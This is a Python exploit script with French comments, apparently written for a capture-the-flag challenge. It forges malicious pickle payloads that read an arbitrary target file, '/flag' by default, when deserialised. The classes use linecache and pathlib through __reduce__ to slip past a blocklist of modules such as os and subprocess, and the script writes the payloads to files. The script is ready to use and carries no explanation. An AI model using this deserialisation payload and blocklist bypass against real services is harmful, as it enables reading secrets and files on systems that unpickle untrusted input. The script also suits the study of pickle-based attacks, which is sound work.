# Forge des payloads pickle dont le desrialise = contenu d'un fichier cible.
# Chaque classe n'importe AUCUN module interdit (os/subprocess/sys/builtins/importlib).
import pickle, sys
TARGET = sys.argv[1] if len(sys.argv) > 1 else '/flag'

class ViaLinecache:
    def __reduce__(self):
        import linecache
        return (linecache.getlines, (TARGET,))          # -> ['NCTF{...}\n']

class ViaPathlib:
    def __reduce__(self):
        import pathlib
        return (pathlib.Path.read_text, (pathlib.Path(TARGET),))   # -> 'NCTF{...}\n'

class ViaIO:
    def __reduce__(self):
        import io
        # io.open(target).read via functools-free: use io.open then .read through codecs? -> on lit tout via readlines join
        return (self._r, (TARGET,))
    @staticmethod
    def _r(t):
        import io
        return io.open(t).read()

payloads = {'linecache': ViaLinecache(), 'pathlib': ViaPathlib()}
for name, obj in payloads.items():
    data = pickle.dumps(obj, protocol=4)
    open(f'payload_{name}.pkl', 'wb').write(data)
    print(name, len(data), 'octets')
